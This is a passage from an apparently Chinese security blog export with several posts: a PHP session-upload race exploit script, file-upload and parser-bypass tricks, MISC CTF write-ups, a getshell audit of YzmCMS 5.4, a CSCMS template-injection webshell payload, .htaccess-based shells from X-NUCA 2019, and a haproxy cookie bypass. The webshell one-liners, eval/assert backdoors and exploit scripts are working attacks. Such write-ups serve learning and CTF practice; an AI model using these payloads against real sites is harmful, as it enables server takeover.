<p>例如服务器存在一文件readme.txt是我们上传的小马文件，我们需要将其名字改成xiaoma.php,并且网站存在文件包含漏洞。</p>
<p>实验代码：</p>
<pre><code class="php">&lt;?php
$b=$_GET[&#39;f&#39;];
include &quot;$b&quot;;
?&gt;</code></pre>
<p>利用脚本：</p>
<pre><code class="python">import requests
import threading

url=&#39;http://www.sql.com/test.php&#39;
r=requests.session()
headers={
    &quot;Cookie&quot;:&#39;PHPSESSID=123&#39;
}
def POST():
    while True:
        file={
            &quot;upload&quot;:(&#39;&#39;,&#39;&#39;)  #上传无效的空文件
        }
        data={
            &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#39;&lt;?php rename(&quot;readme.txt&quot;,&quot;xiaoma.php&quot;);?&gt;&#39;     #恶意进度信息，
        }
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.get(&quot;http://www.sql.com/test.php?f=../../tmp/tmp/sess_123&quot;)
        if &#39;flag&#39; not in t.text:
            print(&#39;[+]retry&#39;)
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()</code></pre>
<p>实验流程：</p>
<ul>
<li><p>上传小马图片得知小马相对地址</p>
</li>
<li><p>构造脚本：在cookie中定义PHPSESSIONID（例如：PHPSESSIONID=123）</p>
<ul>
<li>将会在var/tmp/tmp（linux环境）生成一个叫sess_123的文件</li>
<li>将会储存PHP_SESSION_UPLOAD_PROGRESS进度信息（例如：PHP_SESSION_UPLOAD_PROGRESS=<?php rename("readme.txt","xiaoma.php");?>）</li>
<li>使用文件包含漏洞包含该含义PHP恶意代码的文件将会执行修改文件的代码</li>
<li>使用多线程同时竞争</li>
</ul>
</li>
</ul>
<p>sess_123文件内容</p>
<pre><code>upload_progress_&lt;?php rename(&quot;readme.txt&quot;,&quot;readme.php&quot;);?&gt;|a:5:{s:10:&quot;start_time&quot;;i:1564991083;s:14:&quot;content_length&quot;;i:288;s:15:&quot;bytes_processed&quot;;i:288;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:6:&quot;upload&quot;;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1564991083;s:15:&quot;bytes_processed&quot;;i:0;}}}</code></pre><p>实验效果：<br><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649914396031.png" alt></p>
<p>修改后变成xiaoma.php（当然可以还可以利用代码生成写入一句话木马）</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649916186321.png" alt></p>
<p><em>（该方法利用出现在强网杯JustSoSo题目中的非预期解）</em></p>
<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>前端验证，直接使用burp抓包修改名字。或者浏览器禁用js</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>上传可执行脚本，修改Content-Type</p>
<h4 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h4><ul>
<li><p><strong>大小写绕过：</strong>Php、PhP、pHp等可Fuzz测试得到黑名单</p>
</li>
<li><p><strong>空格截断：</strong>在后缀后面使用一个空格截断检测</p>
</li>
<li><p><strong>重写绕过：</strong>主要用于将php这个关键字进行替换为空的例如如下代码</p>
</li>
</ul>
<pre><code class="php">&lt;?php
$type=str_replace(&#39;php&#39;,&#39;&#39;,$a);
?&gt;</code></pre>
<p>可以使用重写直接绕过该替换例如修改为：1.pphphp ,将可以直接绕过过滤</p>
<ul>
<li><p><strong>特殊后缀名绕过：</strong>ASP语言类：.asa    .cer    .cdx</p>
<pre><code>                          PHP语言类:    .php3    .php4    .php5
                               .net语言类：.ashx</code></pre></li>
<li><p><strong>文件头检测绕过：</strong>使用图片马或者给小马加个图片头</p>
</li>
<li><p><strong>分布式配置文件绕过：</strong>能够上传或者修改.htacess文件，是服务器在该文件夹解析jpg文件。</p>
</li>
<li><p><strong>分布式配置文件上传漏洞的实例</strong></p>
</li>
</ul>
<ol>
<li><p>建立.htaccess文件,内容如下:</p>
<pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre><p>并将其上传至服务器中</p>
</li>
</ol>
<p>并将其上传至服务器中</p>
<ol start="2">
<li>上传php木马文件名包含jpg即可造成解析</li>
</ol>
<ul>
<li><strong>上传文件类型00截断</strong></li>
</ul>
<p>burpsuite上传抓包，16进制下修改文件名与后缀之间的一个字符的16进制改成00；</p>
<p>例如：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15650128192120.png" alt></p>
<h4 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h4><ul>
<li><strong>Apache2.2.11解析漏洞</strong></li>
</ul>
<p>例如：cimer.php.owf.rar  “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把cimer.php.owf.rar解析成php</p>
<ul>
<li><strong>IIS6.0解析漏洞</strong></li>
</ul>
<p><strong>1.目录解析漏洞</strong></p>
<p>在网站下建立文件夹的名字为 .asp /.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</p>
<p>例如： /cimer.asp/1.jpg 将会被按照正常的asp文件进行解析<br><strong>2.文件解析漏洞</strong></p>
<p>在IIS6.0下，分号后面的不被解析，如 cimer.asp;.jpg会被当做cimer.asp<br>还有iis6.0默认的可执行文件除了asp还包含.asa、.cer、.cdx</p>
<p>Nginx解析漏洞<br>在默认Fast-CGI开启状况下,攻击者上传一个名字为cimer.jpg，内容为</p>
<pre><code class="PHP">&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;</code></pre>
<p>然后访问cimer.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MISC专项训练笔记</title>
    <url>//articles/d430b53b04.html</url>
    <content><![CDATA[<h2 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h2><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875492048718.png" alt="img"></p>
<p>一堆乱七八糟的图片。直接用montage合成一张图。</p>
<pre><code class="shell">montage *.jpg -geometry +0+0+0 ok.jpg</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875497047175.jpg" alt="img"></p>
<pre><code>gaps --image=ok.jpg --generations=50 --population=120 --size=50</code></pre><p>出来flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875505799743.png" alt="img"></p>
<h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>压缩包打开失败…于是猜测文件损坏。用010打开，docx映入眼帘，同时文件头被修改，改回来RAR即可。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587550972340.png" alt="img"></p>
<p>用word打开显示隐藏文字得到：</p>
<pre><code>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</code></pre><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">千千字</a>秀解密得到：</p>
<pre><code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></pre><h2 id="MRCTF2020-寻找xxx"><a href="#MRCTF2020-寻找xxx" class="headerlink" title="[MRCTF2020]寻找xxx"></a>[MRCTF2020]寻找xxx</h2><p>打开电话拨号声，不用想直接扔<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf</a>读取出来，然后手动去重，因为有干扰声。</p>
<p>18684221609</p>
<h2 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h2><p>binwalk分离出来一个加密的压缩包。爆破无果。</p>
<p>用StegSolve图片中分离出一张图片得到密码：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875597586078.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875598279919.png" alt="img"></p>
<p>解压出来是TTL.用脚本转换为字符</p>
<pre><code class="python">import re

txt = open(&quot;out.txt&quot;,&#39;r&#39;)
line = txt.readlines()
number = []
flag = &quot;&quot;
for i in line:
    number.append(int(i))
for i in number:
    if(i == 63):
        flag += &quot;00&quot;
    elif(i == 127):
        flag += &quot;01&quot;
    elif(i == 191):
        flag += &quot;10&quot;
    else:
        flag += &quot;11&quot;
strr = re.findall(r&#39;.{8}&#39;, flag)
for i in strr:
    print(chr(int(i,2)),end=&quot;&quot;)</code></pre>
<p>得到密码<code>0ac1fe6b77be5dbe</code> 压缩包里面再得到一个word，文字全部变成黑色得到：</p>
<pre><code>MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx
MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx
MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx
MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx
MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</code></pre><p>base64隐写，用<a href="https://github.com/jerrita/b64steg" target="_blank" rel="noopener">b64steg</a>解密</p>
<pre><code>b64steg.py -f stego.txt -s out.txt</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20200422/1587560232982.png" alt="img"></p>
<h2 id="MRCTF2020-摇滚DJ"><a href="#MRCTF2020-摇滚DJ" class="headerlink" title="[MRCTF2020]摇滚DJ"></a>[MRCTF2020]摇滚DJ</h2><p><a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a> 直接AFSK1200无线电解码。<br><img src="http://goodcheerleung.gitee.io/mycute/20200422/15875614783837.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次MISC二维码的修复</title>
    <url>//articles/d44a4997a7.html</url>
    <content><![CDATA[<p>二维码是个一半的二维码。</p>
<p><img src="https://goodcheerleung.gitee.io/blog/qrcode1.png" alt="qcode"></p>
<p>用qrazybox/进行修复（<a href="https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools</a> - Extract QR Information</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130627.png" alt="2"></p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130839.png" alt="20200424130839.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>YzmCMS-V5.4 后台Getshell</title>
    <url>//articles/d45484efe7.html</url>
    <content><![CDATA[<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><blockquote>
<p>漏洞文件：yzmphp\core\class\cache_file.class.php</p>
</blockquote>
<ul>
<li>代码171-179行,使用了file_put_contents(),其中<code>$file</code>和<code>$contents</code>可控</li>
</ul>
<pre><code class="php">protected function _fileputcontents($file, $contents){
    if($this-&gt;config[&#39;mode&#39;] == 1){
        $contents = serialize($contents);
    }else{
        $contents = &quot;&lt;?php\nreturn &quot;.var_export($contents, true).&quot;;\n?&gt;&quot;;
    }

    $filesize = file_put_contents($file, $contents, LOCK_EX);
    return $filesize ? $filesize : false;
}</code></pre>
<ul>
<li>我们继续跟进<code>_fileputcontents()</code>,在同一文件代码62-75行调用了该方法，我们继续跟进<code>set()</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576413364302.png" alt="img"></p>
<blockquote>
<p>漏洞文件：yzmphp\core\function\global.func.php</p>
</blockquote>
<ul>
<li><code>global.func.php</code>的1017-1021中的<code>setcache()</code>方法疑似调用了<code>set()</code>方法,并且<code>$name, $data, $timeout</code>均可控，我们跟进<code>load_sys_class(&#39;cache_factory&#39;,&#39;&#39;,0);</code>看看<code>get_instance()-&gt;get_cache_instances()</code>到底调用了哪个文件。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764136241676.png" alt="img"></p>
<blockquote>
<p>漏洞文件：\yzmphp\core\class\cache_factory.class.php</p>
</blockquote>
<ul>
<li>很明显<code>C(&#39;cache_type&#39;)</code>决定了他调用哪个文件中的<code>set()</code>方法，我们跟进<code>cache_type</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764138453674.png" alt="img"></p>
<ul>
<li>跟进发现在<code>common\config\config.php</code>做了定义，<code>cache_type</code>默认使用<code>file</code>，<code>mode</code>存在两种模式，我们选择<code>1</code>-序列化看看或许可能读取缓存存在反序列化的可能。那么回头看他默认使用<code>file</code>也就是调用了<code>cache_file.class.php</code>所以我们的猜测没错。同时这里还是用了<code>file_config</code>这个参数，我们继续跟进<code>setcache()</code>方法</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764140583404.png" alt="img"></p>
<blockquote>
<p>漏洞文件：\common\function\system.func.php</p>
</blockquote>
<ul>
<li>这里$modelinfo是从数据库中得到所以可控，$filename指定了名称<code>modelinfo</code>或者<code>modelinfo_all</code>。我们继续跟进<code>get_modelinfo()</code>会发现都不传入参数，所以默认$typeall = 0,也就是说文件名称固定<code>modelinfo</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764172002656.png" alt="img"></p>
<ul>
<li>我们再回到<code>yzmphp\core\class\cache_file.class.php</code>,发现文件名称和路径由<code>_file()</code>方法决定。而<code>$id</code>正是我们传入的。我们跟进<code>_file()</code>方法</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764175738040.png" alt="img"></p>
<ul>
<li>我们可以得知filename是由config[‘cache_dir’] 和传入的<code>$id</code>和<code>config[&#39;suffix&#39;]</code>拼接而成。我们再看<code>config[&#39;suffix&#39;]</code>和<code>&#39;cache_dir&#39;</code>是什么?</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216664657.png" alt="img"></p>
<ul>
<li>我们在审计<code>common\config\config.php</code>时候已经发现这里定义了<code>file_config</code>,这样我们就完整知道缓存文件写在<code>cache/chche_file/modelinfo.cache.php</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764216283148.png" alt="img"></p>
<ul>
<li>而且这里是模型的缓存，我们直接到后台写入一个php代码看看。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/1576421587721.png" alt="img"></p>
<ul>
<li>需要访问前台让其生成新的缓存文件。我们打开：<code>cache/chche_file/modelinfo.cache.php</code>看看</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191215/15764187209911.png" alt="img"></p>
<ul>
<li>我们访问<code>http://域名/cache/chche_file/modelinfo.cache.php</code>看看，成功getshell<br> <img src="http://goodcheerleung.gitee.io/mycute/20191215/15764196355940.png" alt="img"></li>
</ul>
<hr>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul>
<li>如果<code>mode</code>选择的模式是2的话是无法getshell的，由于<code>var_export()</code>进行了转义，暂时没有找到方法，但是该cms默认的是选择<code>2</code>导致这个漏洞有点鸡肋。</li>
</ul>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>复现强网杯线下赛CSCMS--SSIT模板注入</title>
    <url>//articles/d458a3f373.html</url>
    <content><![CDATA[<p>漏洞存在于：<code>\app\models\Csskins.php</code></p>
<ul>
<li><code>cscms_php</code>这个类方法中存在代码执行，：</li>
</ul>
<pre><code class="php">    // php标签处理
    public function cscms_php($php,$content,$str) {
        $evalstr=&quot; return $content&quot;;
        $newsphp=eval($evalstr);
        $str=str_replace($php,$newsphp,$str);
        return $str;
    }</code></pre>
<ul>
<li>我们追踪<code>cscms_php</code>在<code>template_parse</code>这个方法中进行了调用，但是这里进行了过滤，这样类型的是可以执行的：<code>{cscmsphp}phpinfo();{/cscmsphp}</code>追踪<code>$str</code>是<code>template_parse</code>的传入参数，我们再继续追踪<code>template_parse</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/1575037851193.png" alt="img"></p>
<ul>
<li>经过一段时间的查找，<code>gbook_list</code>类方法调用了<code>template_parse</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750381995978.png" alt="img"></p>
<ul>
<li>我们追踪<code>$Mark_Text</code>发现它是由<code>$data_content</code>经过替换得到。那么我们继续追踪<code>$data_content</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750384557070.png" alt="img"></p>
<ul>
<li>从下面代码我们可以简单知道<code>$data_content</code>是由一个数组得到的，而这个数组是通过查询数据库得到的。这里就可以得到一个思路，就是通过留言板把payload写入数据库，而后<code>gbook_list</code>会把payload拿出来去渲染，因为这里无论内容有哪些最终在传到<code>cscms_php</code>这个类方法时候都会获取到payload。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750386263446.png" alt="img"></p>
<ul>
<li>留言处插入如下payload</li>
</ul>
<pre><code>{cscmsphp}assert($_REQUEST[pwd]);{/cscmsphp}</code></pre><ul>
<li>访问：</li>
</ul>
<pre><code>http://www.tp5.com/index.php/gbook/lists/1?pwd=phpinfo();</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750393335223.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>X-NUCA‘2019 ——Ezphp复盘总结</title>
    <url>//articles/d4770d39c3.html</url>
    <content><![CDATA[<p>emmm….这次比赛题目质量太高所以我这种菜鸡基本没有做出来的题目，但是思路大体正确，但是关键点没有想出来。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    include_once(&quot;fl3g.php&quot;);
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
        echo &quot;Hacker&quot;;
        die();
    }
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
        echo &quot;Hacker&quot;;
        die();
    }
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
?&gt; </code></pre>
<h2 id="复盘检讨"><a href="#复盘检讨" class="headerlink" title="复盘检讨"></a>复盘检讨</h2><p>其实这题已经想到了使用<code>.htaccess</code>文件去包含php代码但是么有想到怎么绕过<code>stristr()</code>。下面记录一下大佬们的wirte up 所用方法并复现学习一波。</p>
<ul>
<li>题目对解析的文件做了限制，只解析index.php，所以做这道题的思路第一反应也是使用<code>.user.ini</code>或者<code>.hatccess</code>去将PHP代码去包含金index.php</li>
</ul>
<h3 id="方法一-“-“绕过stristr-检测"><a href="#方法一-“-“绕过stristr-检测" class="headerlink" title="方法一 “\“绕过stristr()检测"></a>方法一 “\“绕过stristr()检测</h3><ul>
<li><p>我们从代码的最后一行可见最后会强行拼接进来一个<code>&quot;\nJust one chance&quot;</code>导致<code>.hatccess</code>无法解析500错误。所以使用反斜杠可以将<code>\n</code>转义为普通字符后使用#注释使得<code>.hatccess</code>能够成功解析。</p>
</li>
<li><p>绕过<code>stristr()</code>检测同样使用“\“作为换行直接绕过该函数的关键字检测。</p>
</li>
<li><p>将<code>.hatccess</code>包含进所以php文件。</p>
</li>
</ul>
<pre><code>php_value auto_prepend_file .htaccess</code></pre><ul>
<li>综上构造payload：</li>
</ul>
<pre><code>php_value auto_prepend_fil\ 
e .htaccess 
#&lt;?php phpinfo();?&gt;\ </code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668911161294.png" alt="img"></p>
<pre><code>?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/1566891242808.png" alt="img"></p>
<h3 id="方法二利用PCRE回溯次数限制绕过正则"><a href="#方法二利用PCRE回溯次数限制绕过正则" class="headerlink" title="方法二利用PCRE回溯次数限制绕过正则"></a>方法二利用PCRE回溯次数限制绕过正则</h3><ul>
<li><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>存在被绕过的可能。</p>
</li>
<li><p><a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
</li>
<li><p>上文是利用回溯次数超出最大值返回False而这里大佬使用了.hatccess去将回溯次数设置为0导致</p>
</li>
</ul>
<pre><code>?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;filename=.htaccess</code></pre><ul>
<li>使用<code>php://filter/write=conver.base64-decode=.htaccess</code>写入base64加密的后门，将.htaccess包含入php</li>
</ul>
<pre><code>?filename=php://filter/write=convert.base64- 
decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm 
Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c </code></pre><ul>
<li>该方法在我自己搭的环境中并未复现成功。</li>
</ul>
<h3 id="利用error-log生成shell"><a href="#利用error-log生成shell" class="headerlink" title="利用error_log生成shell"></a>利用error_log生成shell</h3><ul>
<li><code>error_lo</code>可以将php的错误信息写在指定目录下</li>
<li>利用include_path包含UTF-7编码后的一句话</li>
<li>利用包含文件不存在导致报错在/tmp下生成fl3g.php</li>
</ul>
<pre><code>php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
# \</code></pre><ul>
<li>生成后再写入如下<code>.htaccess</code>，将include目录更改为tmp和解码UTF-7(<a href="https://www.plasf.cn/2019/08/25/Easy-PHP-Write-up/">上一篇SUCTF</a>博客有提到)</li>
</ul>
<pre><code>php_value include_path &quot;/tmp&quot;
php_value zend.multibyte 1
php_value zend.script_encoding &quot;UTF-7&quot;
# \</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190827/15668987829847.png" alt="img"></p>
<p>（注意写入content使用url编码后传入）</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Midnight SUN CTF 2020  Write up</title>
    <url>//articles/d497e0f4e8.html</url>
    <content><![CDATA[<h2 id="harproxy"><a href="#harproxy" class="headerlink" title="harproxy"></a>harproxy</h2><p>题目一开始就给出了<code>harproxy</code>的配置文件：</p>
<pre><code>global
  daemon
  log 127.0.0.1 local0 debug

defaults
  log               global
  retries           3
  maxconn           2000
  timeout connect   5s
  timeout client    50s
  timeout server    50s

resolvers docker_resolver
  nameserver dns 127.0.0.11:53

frontend internal_access
  bind 127.0.0.1:8080
  mode http
  use_backend test

frontend internet_access
  bind *:80
  errorfile 403 /etc/haproxy/errorfiles/403custom.http
  http-response set-header Server Server
  http-request deny if METH_POST
  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  mode http
  use_backend test

backend test
  balance roundrobin
  mode http
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4
</code></pre><h3 id="harproxy配置"><a href="#harproxy配置" class="headerlink" title="harproxy配置"></a>harproxy配置</h3><p>可以看到有四个核心的设置：</p>
<pre><code>  http-request deny if { path_beg /admin }
  http-request deny if { cook(IMPERSONATE) -m found }
  http-request deny if { hdr_len(Cookie) gt 69 }
  .........
  server flaskapp app:8282 resolvers docker_resolver resolve-prefer ipv4</code></pre><ul>
<li>拒绝url路径为/admin开头</li>
<li>拒绝cookie不是IMPERSONATE开头</li>
<li>拒绝长度大于69的cookie</li>
<li>这是一个flask应用</li>
</ul>
<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><ul>
<li>bypass<code>http-request deny if { path_beg /admin }</code>直接使用用<code>//admin</code>进行绕过，但是在测试中发现GET方式仍然不行，最后在其他大佬的wp中看到使用的是HEAD进行发送。最后会出来cookie:</li>
</ul>
<p><img src="https://cdn.redmango.top/img/20200405214255.png" alt="img"></p>
<ul>
<li>传输cookies时候还有个小trick，<code>http1.1</code>是允许cookie分段传输的所以</li>
</ul>
<pre><code>Cookie: KEY=0be40039bcd8286eab237f481641b16e5e3ab442e0bc1135f08c143b22dc1efc;
Cookie: IMPERSONATE=admin</code></pre><ul>
<li>但是传入正则后仍然无法getflag</li>
</ul>
<p><img src="https://cdn.redmango.top/img/20200405214602.png" alt="img"></p>
<ul>
<li>这里就和flask和haproxy解析cookies的结果不一样导致bypass.看wp是使用进行绕过</li>
</ul>
<blockquote>
<pre><code>;=IMPERSONATE=admin</code></pre></blockquote>
<ul>
<li>我们直接看flask的request的cookie方法：</li>
</ul>
<pre><code class="python">_cookie_re = re.compile(
    br&quot;&quot;&quot;
    (?P&lt;key&gt;[^=;]+)
    (?:\s*=\s*
        (?P&lt;val&gt;
            &quot;(?:[^\\&quot;]|\\.)*&quot; |
             (?:.*?)
        )
    )?
    \s*;
&quot;&quot;&quot;,
    flags=re.VERBOSE,
)</code></pre>
<ul>
<li>我们传入<code>;=IMPERSONATE=admin</code>发现cookie直接被解析了。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200407/15862420918417.png" alt="img"></p>
<h2 id="Crossintheroof"><a href="#Crossintheroof" class="headerlink" title="Crossintheroof"></a>Crossintheroof</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="php+HTML">&lt;?php
 header(&#39;X-XSS-Protection: 0&#39;);
 header(&#39;X-Frame-Options: deny&#39;);
 header(&#39;X-Content-Type-Options: nosniff&#39;);
 header(&#39;Content-Type: text/html; charset=UTF-8&#39;);

if(!isset($_GET[&#39;xss&#39;])){
    if(isset($_GET[&#39;error&#39;])){
        die(&#39;stop haking me!!!&#39;);
    }

    if(isset($_GET[&#39;source&#39;])){
        highlight_file(&#39;index.php&#39;);
        die();
    }

    die(&#39;unluky&#39;);
}

 $xss = $_GET[&#39;xss&#39;]?$_GET[&#39;xss&#39;]:&quot;&quot;;
 $xss = preg_replace(&quot;|[}/{]|&quot;, &quot;&quot;, $xss);

?&gt;
&lt;script&gt;
setTimeout(function(){
    try{
        return location = &#39;/?i_said_no_xss_4_u_:)&#39;;
        nodice=&lt;?php echo $xss; ?&gt;;
    }catch(err){
        return location = &#39;/?error=&#39;+&lt;?php echo $xss; ?&gt;;
    }
    },500);
&lt;/script&gt;
&lt;script&gt;
/* 
    payload: &lt;?php echo $xss ?&gt;

*/
&lt;/script&gt;
&lt;body onload=&#39;location=&quot;/?no_xss_4_u_:)&quot;&#39;&gt;hi. bye.&lt;/body&gt;</code></pre>
<h3 id="暂存死区"><a href="#暂存死区" class="headerlink" title="暂存死区"></a>暂存死区</h3><ul>
<li><p><code>&lt;!-- &lt;srcpit&gt;</code></p>
</li>
